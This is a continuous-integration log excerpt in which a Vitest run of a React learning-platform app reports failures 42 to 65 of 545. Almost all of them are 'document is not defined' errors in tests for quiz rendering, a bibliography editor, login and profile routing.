2025-11-18T17:36:11.0230575Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[42/545]⎯[22m[39m
2025-11-18T17:36:11.0230912Z 
2025-11-18T17:36:11.0232776Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould pass correct props to LearningQuizTaker
2025-11-18T17:36:11.0234630Z [31m[1mTypeError[22m: vi.requireMock is not a function[39m
2025-11-18T17:36:11.0235760Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m81:36[22m[39m
2025-11-18T17:36:11.0236504Z     [90m 79| [39m
2025-11-18T17:36:11.0237551Z     [90m 80| [39m    it('should pass correct props to LearningQuizTaker', () => {
2025-11-18T17:36:11.0238610Z     [90m 81| [39m      const LearningQuizTaker = vi.requireMock('../components/quiz/Lea…
2025-11-18T17:36:11.0239472Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.0240030Z     [90m 82| [39m      
2025-11-18T17:36:11.0240539Z     [90m 83| [39m      render(
2025-11-18T17:36:11.0240810Z 
2025-11-18T17:36:11.0241226Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[43/545]⎯[22m[39m
2025-11-18T17:36:11.0241579Z 
2025-11-18T17:36:11.0243571Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback message when required props are missing
2025-11-18T17:36:11.0245416Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0246589Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0248033Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m110:7[22m[39m
2025-11-18T17:36:11.0249101Z     [90m108| [39m
2025-11-18T17:36:11.0249847Z     [90m109| [39m    it('should show fallback message when required props are missing',…
2025-11-18T17:36:11.0250582Z     [90m110| [39m      render(
2025-11-18T17:36:11.0251113Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0251743Z     [90m111| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0252377Z     [90m112| [39m          block={quizBlock}
2025-11-18T17:36:11.0252698Z 
2025-11-18T17:36:11.0253105Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[44/545]⎯[22m[39m
2025-11-18T17:36:11.0253450Z 
2025-11-18T17:36:11.0277512Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when lessonId is missing
2025-11-18T17:36:11.0279368Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0280619Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0281958Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m127:7[22m[39m
2025-11-18T17:36:11.0283071Z     [90m125| [39m
2025-11-18T17:36:11.0285011Z     [90m126| [39m    it('should show fallback when lessonId is missing', () => {
2025-11-18T17:36:11.0287018Z     [90m127| [39m      render(
2025-11-18T17:36:11.0290239Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0294012Z     [90m128| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0295186Z     [90m129| [39m          block={quizBlock}
2025-11-18T17:36:11.0297510Z 
2025-11-18T17:36:11.0299640Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[45/545]⎯[22m[39m
2025-11-18T17:36:11.0301289Z 
2025-11-18T17:36:11.0303908Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when courseId is missing
2025-11-18T17:36:11.0305983Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0307615Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0309056Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m145:7[22m[39m
2025-11-18T17:36:11.0309921Z     [90m143| [39m
2025-11-18T17:36:11.0310844Z     [90m144| [39m    it('should show fallback when courseId is missing', () => {
2025-11-18T17:36:11.0311882Z     [90m145| [39m      render(
2025-11-18T17:36:11.0312703Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0314003Z     [90m146| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0314947Z     [90m147| [39m          block={quizBlock}
2025-11-18T17:36:11.0315423Z 
2025-11-18T17:36:11.0315954Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[46/545]⎯[22m[39m
2025-11-18T17:36:11.0316361Z 
2025-11-18T17:36:11.0318376Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when studentId is missing
2025-11-18T17:36:11.0322514Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0324288Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0325674Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m163:7[22m[39m
2025-11-18T17:36:11.0326603Z     [90m161| [39m
2025-11-18T17:36:11.0327697Z     [90m162| [39m    it('should show fallback when studentId is missing', () => {
2025-11-18T17:36:11.0328556Z     [90m163| [39m      render(
2025-11-18T17:36:11.0329178Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0329877Z     [90m164| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0330609Z     [90m165| [39m          block={quizBlock}
2025-11-18T17:36:11.0331025Z 
2025-11-18T17:36:11.0331530Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[47/545]⎯[22m[39m
2025-11-18T17:36:11.0333498Z 
2025-11-18T17:36:11.0335440Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould call onComplete with correct data when quiz is completed
2025-11-18T17:36:11.0337440Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0338608Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0339875Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m183:7[22m[39m
2025-11-18T17:36:11.0340863Z     [90m181| [39m  describe('Quiz Completion Handling', () => {
2025-11-18T17:36:11.0341880Z     [90m182| [39m    it('should call onComplete with correct data when quiz is complete…
2025-11-18T17:36:11.0342689Z     [90m183| [39m      render(
2025-11-18T17:36:11.0343226Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0343844Z     [90m184| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0344509Z     [90m185| [39m          block={quizBlock}
2025-11-18T17:36:11.0344825Z 
2025-11-18T17:36:11.0345245Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[48/545]⎯[22m[39m
2025-11-18T17:36:11.0345581Z 
2025-11-18T17:36:11.0347463Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould not show scores in completion data
2025-11-18T17:36:11.0388933Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0390150Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0391382Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m208:7[22m[39m
2025-11-18T17:36:11.0392053Z     [90m206| [39m
2025-11-18T17:36:11.0392698Z     [90m207| [39m    it('should not show scores in completion data', () => {
2025-11-18T17:36:11.0393400Z     [90m208| [39m      render(
2025-11-18T17:36:11.0393940Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0394740Z     [90m209| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0395394Z     [90m210| [39m          block={quizBlock}
2025-11-18T17:36:11.0395727Z 
2025-11-18T17:36:11.0396179Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[49/545]⎯[22m[39m
2025-11-18T17:36:11.0396507Z 
2025-11-18T17:36:11.0398562Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould show completion status when quiz is already completed
2025-11-18T17:36:11.0400348Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0401476Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0402724Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m235:7[22m[39m
2025-11-18T17:36:11.0403392Z     [90m233| [39m
2025-11-18T17:36:11.0404137Z     [90m234| [39m    it('should show completion status when quiz is already completed',…
2025-11-18T17:36:11.0404915Z     [90m235| [39m      render(
2025-11-18T17:36:11.0405459Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0406043Z     [90m236| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0406665Z     [90m237| [39m          block={quizBlock}
2025-11-18T17:36:11.0447395Z 
2025-11-18T17:36:11.0447890Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[50/545]⎯[22m[39m
2025-11-18T17:36:11.0448259Z 
2025-11-18T17:36:11.0449813Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mAdmin Mode[2m > [22mshould render quiz for admin users
2025-11-18T17:36:11.0451399Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0452569Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0453814Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m255:7[22m[39m
2025-11-18T17:36:11.0455001Z     [90m253| [39m  describe('Admin Mode', () => {
2025-11-18T17:36:11.0455798Z     [90m254| [39m    it('should render quiz for admin users', () => {
2025-11-18T17:36:11.0456468Z     [90m255| [39m      render(
2025-11-18T17:36:11.0457192Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0457802Z     [90m256| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0458466Z     [90m257| [39m          block={quizBlock}
2025-11-18T17:36:11.0458787Z 
2025-11-18T17:36:11.0459208Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[51/545]⎯[22m[39m
2025-11-18T17:36:11.0459533Z 
2025-11-18T17:36:11.0461145Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mDifferent Quiz Types[2m > [22mshould handle quiz with no title
2025-11-18T17:36:11.0462726Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0463840Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0465059Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m283:7[22m[39m
2025-11-18T17:36:11.0465775Z     [90m281| [39m      };
2025-11-18T17:36:11.0466193Z     [90m282| [39m
2025-11-18T17:36:11.0466618Z     [90m283| [39m      render(
2025-11-18T17:36:11.0467312Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0467872Z     [90m284| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0468733Z     [90m285| [39m          block={noTitleQuiz}
2025-11-18T17:36:11.0469093Z 
2025-11-18T17:36:11.0469539Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[52/545]⎯[22m[39m
2025-11-18T17:36:11.0469866Z 
2025-11-18T17:36:11.0471576Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mDifferent Quiz Types[2m > [22mshould handle quiz with mixed question types
2025-11-18T17:36:11.0473260Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0597448Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0599076Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m334:7[22m[39m
2025-11-18T17:36:11.0599775Z     [90m332| [39m      };
2025-11-18T17:36:11.0600184Z     [90m333| [39m
2025-11-18T17:36:11.0600617Z     [90m334| [39m      render(
2025-11-18T17:36:11.0601114Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0601706Z     [90m335| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0602300Z     [90m336| [39m          block={mixedQuiz}
2025-11-18T17:36:11.0602609Z 
2025-11-18T17:36:11.0603004Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[53/545]⎯[22m[39m
2025-11-18T17:36:11.0603322Z 
2025-11-18T17:36:11.0604829Z [31m[1m[7m FAIL [27m[22m[39m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mProgress Tracking[2m > [22mshould track time spent on quiz
2025-11-18T17:36:11.0606359Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0607633Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0608804Z [36m [2m❯[22m __tests__/StudentBlockRenderer.quiz.test.tsx:[2m355:7[22m[39m
2025-11-18T17:36:11.0609650Z     [90m353| [39m      vi.useFakeTimers();
2025-11-18T17:36:11.0610154Z     [90m354| [39m
2025-11-18T17:36:11.0610610Z     [90m355| [39m      render(
2025-11-18T17:36:11.0611139Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.0611826Z     [90m356| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.0612467Z     [90m357| [39m          block={quizBlock}
2025-11-18T17:36:11.0612783Z 
2025-11-18T17:36:11.0613208Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[54/545]⎯[22m[39m
2025-11-18T17:36:11.0613541Z 
2025-11-18T17:36:11.0614870Z [31m[1m[7m FAIL [27m[22m[39m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould render Add Image button
2025-11-18T17:36:11.0616253Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0618017Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0619107Z [36m [2m❯[22m __tests__/bibliography-image.test.tsx:[2m42:5[22m[39m
2025-11-18T17:36:11.0619708Z     [90m 40| [39m
2025-11-18T17:36:11.0620295Z     [90m 41| [39m  test('should render Add Image button', () => {
2025-11-18T17:36:11.0620967Z     [90m 42| [39m    render(
2025-11-18T17:36:11.0621507Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0622107Z     [90m 43| [39m      <BibliographyBlockEditor
2025-11-18T17:36:11.0622751Z     [90m 44| [39m        block={mockBlock}
2025-11-18T17:36:11.0623054Z 
2025-11-18T17:36:11.0623469Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[55/545]⎯[22m[39m
2025-11-18T17:36:11.0623793Z 
2025-11-18T17:36:11.0625345Z [31m[1m[7m FAIL [27m[22m[39m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould add new image item when Add Image button is clicked
2025-11-18T17:36:11.0711360Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0712800Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0713851Z [36m [2m❯[22m __tests__/bibliography-image.test.tsx:[2m58:5[22m[39m
2025-11-18T17:36:11.0714439Z     [90m 56| [39m
2025-11-18T17:36:11.0715457Z     [90m 57| [39m  test('should add new image item when Add Image button is clicked', (…
2025-11-18T17:36:11.0716163Z     [90m 58| [39m    render(
2025-11-18T17:36:11.0716612Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0717423Z     [90m 59| [39m      <BibliographyBlockEditor
2025-11-18T17:36:11.0717961Z     [90m 60| [39m        block={mockBlock}
2025-11-18T17:36:11.0718243Z 
2025-11-18T17:36:11.0718615Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[56/545]⎯[22m[39m
2025-11-18T17:36:11.0718908Z 
2025-11-18T17:36:11.0720125Z [31m[1m[7m FAIL [27m[22m[39m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould validate image file type on upload
2025-11-18T17:36:11.0721412Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0722465Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0723567Z [36m [2m❯[22m __tests__/bibliography-image.test.tsx:[2m99:27[22m[39m
2025-11-18T17:36:11.0724201Z     [90m 97| [39m    };
2025-11-18T17:36:11.0724591Z     [90m 98| [39m
2025-11-18T17:36:11.0725075Z     [90m 99| [39m    const { container } = render(
2025-11-18T17:36:11.0725682Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.0726275Z     [90m100| [39m      <BibliographyBlockEditor
2025-11-18T17:36:11.0727059Z     [90m101| [39m        block={blockWithImage}
2025-11-18T17:36:11.0727376Z 
2025-11-18T17:36:11.0727744Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[57/545]⎯[22m[39m
2025-11-18T17:36:11.0728039Z 
2025-11-18T17:36:11.0729618Z [31m[1m[7m FAIL [27m[22m[39m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould show image preview when uploaded
2025-11-18T17:36:11.0731027Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0732185Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0733343Z [36m [2m❯[22m __tests__/bibliography-image.test.tsx:[2m146:5[22m[39m
2025-11-18T17:36:11.0733987Z     [90m144| [39m    };
2025-11-18T17:36:11.0734394Z     [90m145| [39m
2025-11-18T17:36:11.0734830Z     [90m146| [39m    render(
2025-11-18T17:36:11.0735307Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0735897Z     [90m147| [39m      <BibliographyBlockEditor
2025-11-18T17:36:11.0736595Z     [90m148| [39m        block={blockWithUploadedImage}
2025-11-18T17:36:11.0737233Z 
2025-11-18T17:36:11.0737657Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[58/545]⎯[22m[39m
2025-11-18T17:36:11.0737999Z 
2025-11-18T17:36:11.0739425Z [31m[1m[7m FAIL [27m[22m[39m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould display image icon in preview mode
2025-11-18T17:36:11.0740866Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0742032Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0743405Z [36m [2m❯[22m __tests__/bibliography-image.test.tsx:[2m182:27[22m[39m
2025-11-18T17:36:11.0744086Z     [90m180| [39m    };
2025-11-18T17:36:11.0744497Z     [90m181| [39m
2025-11-18T17:36:11.0745023Z     [90m182| [39m    const { container } = render(
2025-11-18T17:36:11.0745672Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.0746311Z     [90m183| [39m      <BibliographyBlockEditor
2025-11-18T17:36:11.0747150Z     [90m184| [39m        block={blockWithImage}
2025-11-18T17:36:11.0747421Z 
2025-11-18T17:36:11.0747802Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[59/545]⎯[22m[39m
2025-11-18T17:36:11.0748073Z 
2025-11-18T17:36:11.0748613Z [31m[1m[7m FAIL [27m[22m[39m __tests__/dummy.test.tsx[2m > [22mrenders a dummy component
2025-11-18T17:36:11.0749370Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0750432Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0751451Z [36m [2m❯[22m __tests__/dummy.test.tsx:[2m10:3[22m[39m
2025-11-18T17:36:11.0751961Z     [90m  8| [39m
2025-11-18T17:36:11.0752524Z     [90m  9| [39mtest('renders a dummy component', () => {
2025-11-18T17:36:11.0753247Z     [90m 10| [39m  render(<DummyComponent />);
2025-11-18T17:36:11.0753821Z     [90m   | [39m  [31m^[39m
2025-11-18T17:36:11.0754587Z     [90m 11| [39m  expect(screen.getByText('Test Component')).toBeInTheDocument();
2025-11-18T17:36:11.0755230Z     [90m 12| [39m});
2025-11-18T17:36:11.0755437Z 
2025-11-18T17:36:11.0755826Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[60/545]⎯[22m[39m
2025-11-18T17:36:11.0756142Z 
2025-11-18T17:36:11.0757300Z [31m[1m[7m FAIL [27m[22m[39m __tests__/login.test.tsx[2m > [22mLoginPage[2m > [22mrenders the login form elements
2025-11-18T17:36:11.0758299Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0759390Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0760423Z [36m [2m❯[22m __tests__/login.test.tsx:[2m19:5[22m[39m
2025-11-18T17:36:11.0774036Z     [90m 17| [39mdescribe('LoginPage', () => {
2025-11-18T17:36:11.0859641Z     [90m 18| [39m  test('renders the login form elements', () => {
2025-11-18T17:36:11.0861100Z     [90m 19| [39m    render(<LoginMock />);
2025-11-18T17:36:11.0861716Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0862625Z     [90m 20| [39m    expect(screen.getByPlaceholderText(/correo electrónico/i)).toBeInT…
2025-11-18T17:36:11.0863808Z     [90m 21| [39m    expect(screen.getByPlaceholderText(/contraseña/i)).toBeInTheDocume…
2025-11-18T17:36:11.0864787Z 
2025-11-18T17:36:11.0865251Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[61/545]⎯[22m[39m
2025-11-18T17:36:11.0865571Z 
2025-11-18T17:36:11.0867146Z [31m[1m[7m FAIL [27m[22m[39m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould redirect to profile page when user is logged in but profile is incomplete
2025-11-18T17:36:11.0868722Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0869894Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0871038Z [36m [2m❯[22m __tests__/profileCompletion.test.tsx:[2m59:5[22m[39m
2025-11-18T17:36:11.0872025Z     [90m 57| [39m    (checkProfileCompletion as Mock).mockResolvedValue(false);
2025-11-18T17:36:11.0872725Z     [90m 58| [39m    
2025-11-18T17:36:11.0873273Z     [90m 59| [39m    render(<HomePage />);
2025-11-18T17:36:11.0873874Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0874382Z     [90m 60| [39m    
2025-11-18T17:36:11.0874915Z     [90m 61| [39m    await waitFor(() => {
2025-11-18T17:36:11.0875209Z 
2025-11-18T17:36:11.0875611Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[62/545]⎯[22m[39m
2025-11-18T17:36:11.0876254Z 
2025-11-18T17:36:11.0878246Z [31m[1m[7m FAIL [27m[22m[39m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould redirect to dashboard when user is logged in and profile is complete
2025-11-18T17:36:11.0879935Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0881087Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0882228Z [36m [2m❯[22m __tests__/profileCompletion.test.tsx:[2m79:5[22m[39m
2025-11-18T17:36:11.0883875Z     [90m 77| [39m    (checkProfileCompletion as Mock).mockResolvedValue(true);
2025-11-18T17:36:11.0884597Z     [90m 78| [39m    
2025-11-18T17:36:11.0885173Z     [90m 79| [39m    render(<HomePage />);
2025-11-18T17:36:11.0885761Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0886253Z     [90m 80| [39m    
2025-11-18T17:36:11.0886966Z     [90m 81| [39m    await waitFor(() => {
2025-11-18T17:36:11.0887303Z 
2025-11-18T17:36:11.0887763Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[63/545]⎯[22m[39m
2025-11-18T17:36:11.0888110Z 
2025-11-18T17:36:11.0889457Z [31m[1m[7m FAIL [27m[22m[39m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould not redirect when user is not logged in
2025-11-18T17:36:11.0890906Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.0892026Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.0893148Z [36m [2m❯[22m __tests__/profileCompletion.test.tsx:[2m94:5[22m[39m
2025-11-18T17:36:11.0893848Z     [90m 92| [39m    });
2025-11-18T17:36:11.0894271Z     [90m 93| [39m    
2025-11-18T17:36:11.0894801Z     [90m 94| [39m    render(<HomePage />);
2025-11-18T17:36:11.0895379Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.0895885Z     [90m 95| [39m    
2025-11-18T17:36:11.0896477Z     [90m 96| [39m    // Wait for loading to complete
2025-11-18T17:36:11.0897021Z 
2025-11-18T17:36:11.0897419Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[64/545]⎯[22m[39m
2025-11-18T17:36:11.0897734Z 
2025-11-18T17:36:11.0899400Z [31m[1m[7m FAIL [27m[22m[39m __tests__/quizSubmission.integration.test.ts[2m > [22mQuiz Submission Integration Tests[2m > [22msubmitQuiz[2m > [22mshould submit quiz successfully with auto-grading
2025-11-18T17:36:11.0901261Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:11.0902465Z [36m [2m❯[22m __tests__/quizSubmission.integration.test.ts:[2m57:31[22m[39m
2025-11-18T17:36:11.0903139Z     [90m 55| [39m
2025-11-18T17:36:11.0903751Z     [90m 56| [39m      // Configure the global mocked supabase
2025-11-18T17:36:11.0904639Z     [90m 57| [39m      vi.mocked(supabase.rpc).mockResolvedValueOnce({
2025-11-18T17:36:11.0905699Z     [90m   | [39m                              [31m^[39m
2025-11-18T17:36:11.0906394Z     [90m 58| [39m        data: mockSubmissionId,
2025-11-18T17:36:11.0907259Z     [90m 59| [39m        error: null
2025-11-18T17:36:11.0907549Z 
2025-11-18T17:36:11.0907946Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[65/545]⎯[22m[39m
2025-11-18T17:36:11.0908259Z 
